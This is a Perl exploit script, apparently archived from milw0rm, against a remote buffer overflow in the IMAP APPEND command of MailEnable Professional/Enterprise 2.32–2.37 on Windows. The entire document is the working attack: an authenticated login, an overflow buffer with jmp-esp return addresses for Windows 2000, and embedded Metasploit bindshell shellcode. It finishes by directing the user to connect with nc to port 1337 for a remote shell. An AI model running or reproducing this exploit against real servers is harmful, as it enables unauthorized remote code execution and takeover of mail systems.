<html><head><title>MailEnable Pro/Ent <= 2.37 (APPEND) Remote Buffer Overflow Exploit</title></head><pre>#!/usr/bin/perl
#
# maildisable-v4.pl
#
# Mail Enable Professional/Enterprise v2.32-4 (win32) remote exploit
# by mu-b - Wed Nov 29 2006
#
# - Tested on: Mail Enable Professional v2.32 (win32) - with HOTFIX
#              Mail Enable Professional v2.33 (win32)
#              Mail Enable Professional v2.35 (win32)
#              Mail Enable Professional v2.37 (win32)
#
########

use Getopt::Std; getopts('t:n:u:p:', \%arg);
use Socket;

# Fixed metasploit win32 bindshell port 1337
my $zshell_win32_bind =
  &quot;\x33\xc9\x83\xe9\xb0&quot;.
  &quot;\x81\xc4\xd0\xfd\xff\xff&quot;. # add %esp, -560
  &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x1d&quot;.
  &quot;\xcc\x32\x69\x83\xeb\xfc\xe2\xf4\xe1\xa6\xd9\x24\xf5\x35\xcd\x96&quot;.
  &quot;\xe2\xac\xb9\x05\x39\xe8\xb9\x2c\x21\x47\x4e\x6c\x65\xcd\xdd\xe2&quot;.
  &quot;\x52\xd4\xb9\x36\x3d\xcd\xd9\x20\x96\xf8\xb9\x68\xf3\xfd\xf2\xf0&quot;.
  &quot;\xb1\x48\xf2\x1d\x1a\x0d\xf8\x64\x1c\x0e\xd9\x9d\x26\x98\x16\x41&quot;.
  &quot;\x68\x29\xb9\x36\x39\xcd\xd9\x0f\x96\xc0\x79\xe2\x42\xd0\x33\x82&quot;.
  &quot;\x1e\xe0\xb9\xe0\x71\xe8\x2e\x08\xde\xfd\xe9\x0d\x96\x8f\x02\xe2&quot;.
  &quot;\x5d\xc0\xb9\x19\x01\x61\xb9\x29\x15\x92\x5a\xe7\x53\xc2\xde\x39&quot;.
  &quot;\xe2\x1a\x54\x3a\x7b\xa4\x01\x5b\x75\xbb\x41\x5b\x42\x98\xcd\xb9&quot;.
  &quot;\x75\x07\xdf\x95\x26\x9c\xcd\xbf\x42\x45\xd7\x0f\x9c\x21\x3a\x6b&quot;.
  &quot;\x48\xa6\x30\x96\xcd\xa4\xeb\x60\xe8\x61\x65\x96\xcb\x9f\x61\x3a&quot;.
  &quot;\x4e\x9f\x71\x3a\x5e\x9f\xcd\xb9\x7b\xa4\x37\x50\x7b\x9f\xbb\x88&quot;.
  &quot;\x88\xa4\x96\x73\x6d\x0b\x65\x96\xcb\xa6\x22\x38\x48\x33\xe2\x01&quot;.
  &quot;\xb9\x61\x1c\x80\x4a\x33\xe4\x3a\x48\x33\xe2\x01\xf8\x85\xb4\x20&quot;.
  &quot;\x4a\x33\xe4\x39\x49\x98\x67\x96\xcd\x5f\x5a\x8e\x64\x0a\x4b\x3e&quot;.
  &quot;\xe2\x1a\x67\x96\xcd\xaa\x58\x0d\x7b\xa4\x51\x04\x94\x29\x58\x39&quot;.
  &quot;\x44\xe5\xfe\xe0\xfa\xa6\x76\xe0\xff\xfd\xf2\x9a\xb7\x32\x70\x44&quot;.
  &quot;\xe3\x8e\x1e\xfa\x90\xb6\x0a\xc2\xb6\x67\x5a\x1b\xe3\x7f\x24\x96&quot;.
  &quot;\x68\x88\xcd\xbf\x46\x9b\x60\x38\x4c\x9d\x58\x68\x4c\x9d\x67\x38&quot;.
  &quot;\xe2\x1c\x5a\xc4\xc4\xc9\xfc\x3a\xe2\x1a\x58\x96\xe2\xfb\xcd\xb9&quot;.
  &quot;\x96\x9b\xce\xea\xd9\xa8\xcd\xbf\x4f\x33\xe2\x01\xf2\x02\xd2\x09&quot;.
  &quot;\x4e\x33\xe4\x96\xcd\xcc\x32\x69&quot;;

# ff e4 -&gt; jmp %esp
my @offsets = ( &quot;\x63\x37\x57\x7c&quot;, # Win2K Server SP4 KERNEL32.dll
                &quot;\x38\x07\xd2\x77&quot;,
                &quot;\xef\xbe\xad\xde&quot;  # DoS
              );

&amp;print_header;

my $target;
my $offset;
my $user;
my $passwd;

if (defined($arg{'t'})) { $target = $arg{'t'} }
if (defined($arg{'n'})) { $offset = $arg{'n'} }
if (defined($arg{'u'})) { $user = $arg{'u'} }
if (defined($arg{'p'})) { $passwd = $arg{'p'} }
if (!(defined($target)) || !(defined($user)) || !(defined($passwd))) { &amp;usage; }
if (!(defined($offset))) { $offset = 0; }
if ($offset &gt; $#offsets) {
    print(&quot;only &quot;.($#offsets+1).&quot; targets known!!\n&quot;);
    exit(1);
} else {
    $offset = $offsets[$offset];
}

my $imapd_port = 143;
my $send_delay = 2;

my $NOP = 'A';

if (connect_host($target, $imapd_port)) {
    print(&quot;-&gt; * Connected\n&quot;);
    send(SOCKET, &quot;1 LOGIN &quot;.$user.&quot; &quot;.$passwd.&quot;\r\n&quot;, 0);
    sleep($send_delay);

    print(&quot;-&gt; * Sending payload\n&quot;);
    $buf = &quot;2 APPEND \&quot;()\&quot;\{&quot;.
           ($NOP x 128).
           &quot;\xef\xbe\xad\xde&quot;.
           $offset.
           &quot;\x01\xa3\x19\x03&quot;.
           ($NOP x 8 ).
           $zshell_win32_bind.
           &quot;\}\r\n&quot;;
    send(SOCKET, $buf, 0);
    sleep($send_delay);

    print(&quot;-&gt; * Successfully sent payload!\n&quot;);
    print(&quot;-&gt; * nc &quot;.$target.&quot; 1337 for shell...\n&quot;);
}

sub print_header {
    print(&quot;MailEnable Pro v2.32-7 remote exploit\n&quot;);
    print(&quot;by: &lt;mu-b\@digit-labs.org&gt;\n\n&quot;);
}

sub usage {
  print(qq(Usage: $0 -t &lt;hostname&gt;

     -t &lt;hostname&gt;    : hostname to test
     -n &lt;num&gt;         : return addy offset number
     -u &lt;username&gt;    : username for login
     -p &lt;password&gt;    : usernames password
));

    exit(1);
}

sub connect_host {
    ($target, $port) = @_;
    $iaddr  = inet_aton($target)                 || die(&quot;Error: $!\n&quot;);
    $paddr  = sockaddr_in($port, $iaddr)         || die(&quot;Error: $!\n&quot;);
    $proto  = getprotobyname('tcp')              || die(&quot;Error: $!\n&quot;);

    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die(&quot;Error: $!\n&quot;);
    connect(SOCKET, $paddr)                      || die(&quot;Error: $!\n&quot;);
    return(1338);
}

# milw0rm.com [2007-03-02]</pre></html>